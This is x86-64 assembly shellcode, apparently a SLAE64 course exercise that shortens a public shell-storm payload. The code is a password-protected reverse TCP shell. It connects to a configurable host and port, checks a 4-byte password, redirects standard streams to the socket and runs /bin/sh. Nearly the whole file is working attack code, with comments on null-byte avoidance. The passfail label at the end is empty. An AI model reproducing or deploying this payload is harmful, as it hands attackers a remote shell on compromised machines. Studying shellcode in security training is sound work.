; original url    : http://shell-storm.org/shellcode/files/shellcode-890.php
; original length : 136
; morphed length  : 128
; original author : Keyman
; morphed author  : Sandro "guly" Zaccarini SLAE64-1497
;
; because author stated TODO: have to make this shorter somehow
; i decided to make this slightly shorter :)

global _start
section .text

; -------------------------------------------------------------------
; Preprocessor directives so you can easily change the port and the
; password.
; -------------------------------------------------------------------

; Host to connect to. Please note that this value will have
; 0x02020202 added to it, this way avoiding the NULL bytes.

%define exp_host    0xFEFDFE7D      ; 127.0.0.1

; Port number to listen on, will xor the second byte later to save some space
%define exp_port        0x5c110102          ; 4444 + 02

; Password to use. Make sure it's not longer than 4 bytes.
%define exp_pass        0x6c6c6568      ; hell

; -------------------------------------------------------------------
; DO NOT TOUCH
; preprocessor directives so syscalls can be easily referenced
; -------------------------------------------------------------------

%define sys_connect 42
%define sys_read     0
%define sys_execve  59
%define sys_dup2    33

_start:

    ; ---------------------------------------------------------------
    ; START: create socket
    ; ---------------------------------------------------------------
      xor rax, rax
      push rax              ; saving for sockaddr
      push rax                          ; struct
      push rax              ; clear rax later
      push rax              ; set rdx to 0
      pop rdx               ; protocol
      mov al, 2
      push rax
      push rax
      pop rsi
      pop rdi               ; AF_INET
      shr rsi, 1            ; SOCK_STREAM
      add al, 39            ; socket syscall (41)
      syscall

    ; ---------------------------------------------------------------
    ; START: create struct
    ;
    ; srv_addr.sin_family = AF_INET;
    ; srv_addr.sin_addr.s_addr = INADDR_ANY;
    ; srv_addr.sin_port = htons(portno);
    ;
    ; This is how it looks like on the stack:
    ; 0x02    0x00    0x11    0x5c    0x7f    0x00    0x00    0x01
    ; 0x20    0x00    0x00    0x00    0x00    0x00    0x00    0x00
    ; ---------------------------------------------------------------

      ; TODO: have to make this shorter somehow
;     mov byte [rsp], 2                 ; set values
;      mov word [rsp+2], exp_port
;      mov dword [rsp+4], exp_host
;      add dword [rsp+4], 0x02020202
; done?
push exp_port
sub byte [rsp+1], 0x1
mov dword [rsp+4], exp_host
add dword [rsp+4], 0x02020202

      push rsp
      pop rsi                           ; addr of struct in rsi

    ; ---------------------------------------------------------------
    ; START: connect
    ; ---------------------------------------------------------------

                    ; rdx is still 0
      push rax              ; socket fd
      pop rdi
      add dl, 16
      mov al, sys_connect
      syscall

    ; ---------------------------------------------------------------
    ; get passwd
    ;
    ; We will work with a 4 byte password, should be more than
    ; enough as no brute forcing is possible. Chances to guess
    ; the right value is 0.  Of course passwd should not contain
    ; null bytes.
    ;
    ; n = read(newsockfd,buffer,4);
    ; ---------------------------------------------------------------

      push rax              ; buffer filled with 0s
      push rsp              ; setup pointer to buf
      pop rsi
      sub rdx, 12           ; set bytes to read (4)
      syscall

      ; compare pass received with valid pass and exit if no match

      push rax
      pop rcx

      push rdi              ; save socket
      pop rax

      sub rcx, 3            ; read only once
      push rsp
      pop rdi
      push exp_pass
      push rsp
      pop rsi
      cmpsq
      jne passfail          ; passwd match, give shell

shell:
    ; ---------------------------------------------------------------
    ; 6. exec shell
    ; ---------------------------------------------------------------

      add cl, 2             ; rcx is 1, so add 2 = 3
      push rax              ; restore socket
      pop rdi
dup_loop:
      push rcx              ; have to save rcx as dup2
                    ; changes it's value
      xor rax, rax

      ; sub rcx, 1 ; dec is smaller
      dec ecx
      push rcx
      pop rsi
      add al, sys_dup2
      syscall
      pop rcx               ; restore the counter
      loop dup_loop

code:
      ; guly note:
      ; was a jmp-call-pop, but doesn't work because data is at 0x401000 that is not writable
      ; resort to good old /bin//sh with a free 0x00
      ; may i have bonus point because i fixed a non-working shellcode? :)
      push rax
      mov rbx, 0x68732f2f6e69622f
      push rbx
      push rsp
      pop rdi
      push rax
      pop rdx
      add al, sys_execve
      syscall


passfail:


